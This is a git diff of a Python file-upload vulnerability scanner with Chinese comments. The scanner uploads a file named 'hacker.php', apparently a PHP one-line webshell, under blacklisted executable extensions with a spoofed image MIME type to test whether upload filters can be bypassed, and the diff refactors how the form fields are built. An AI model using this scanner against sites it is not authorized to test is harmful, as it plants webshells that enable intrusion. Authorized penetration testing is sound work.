@@ -12,6 +12,7 @@
     # 内容检查绕过
     1.文件头检查绕过（通过已生成的图片马）--- 若存在文件包含漏洞可验证，进而判断是否进行二次渲染绕过，目前只制作了php一句话木马的图片马
 '''
+from dataclasses import fields
 
 import requests
 from requests_toolbelt.multipart.encoder import MultipartEncoder
@@ -203,10 +204,10 @@ class FileUploadScanner:
                 return
 
         if self.flag_str in resp.text:
-            print("%s文件上传成功" % multipart.fields['uploaded'][0])
+            print("文件上传成功")
             return True
         else:
-            print("%s文件上传失败" % multipart.fields['uploaded'][0])
+            print("文件上传失败")
             return False
 
     # 检测是否支持该类型程序的检测
@@ -217,7 +218,8 @@ class FileUploadScanner:
             return False
 
     # 检测方式一：遍历可执行脚本后缀黑名单，包括大小写
-    def check_script_extension(self, program_language: str, url: str, cookie: dict = None, header: dict = None):
+    def check_script_extension(self, program_language: str, url: str, cookie: dict = None, header: dict = None,
+                               multipart_data: dict = None, file_data_key: str = None):
         script_type_change = program_language.lower() if program_language.isupper() else program_language.upper()
         regex = re.compile(r'\b(%s|%s)\b' % (program_language, script_type_change), re.IGNORECASE)
 
@@ -229,24 +231,20 @@ class FileUploadScanner:
         for key, suffixes in self.black_dict.items():
             if regex.search(key):
                 print("检测到%s类型文件，将检测如下后缀: %s" % (key, suffixes))
-
                 # 遍历指定程序可执行文件后缀
                 for suffix in suffixes:
                     # 构建文件上传基本载荷
-                    multipart_data = MultipartEncoder(
-                        fields={
-                            'MAX_FILE_SIZE': '100000',
-                            'Upload': 'Upload',
-                            'uploaded': ['hacker.%s' % suffix, open('hacker.php', 'rb'), 'image/png']  # 这里指定了MIME类型
-                        }
-                    )
-                    header['Content-Type'] = multipart_data.content_type
+                    with open('hacker.php', 'rb') as file:
+                        custom_fields = multipart_data.copy()
+                        custom_fields[file_data_key] = ['hacker.%s' % suffix, file, 'image/png']  # 这里指定MIME类型
+                        multipart = MultipartEncoder(fields=custom_fields)
+                        header['Content-Type'] = multipart.content_type
 
-                    # 判断是否上传成功
-                    if self.is_upload_success(url, cookie, header, multipart_data):
-                        print("检测到.%s后缀文件上传漏洞" % suffix)
-                    else:
-                        print("未检测到.%s后缀文件上传漏洞" % suffix)
+                        # 判断是否上传成功
+                        if self.is_upload_success(url, cookie, header, multipart):
+                            print("检测到.%s后缀文件上传漏洞" % suffix)
+                        else:
+                            print("未检测到.%s后缀文件上传漏洞" % suffix)
 
     # 检查是否有图片马
     def check_shell_type(self, program_language):
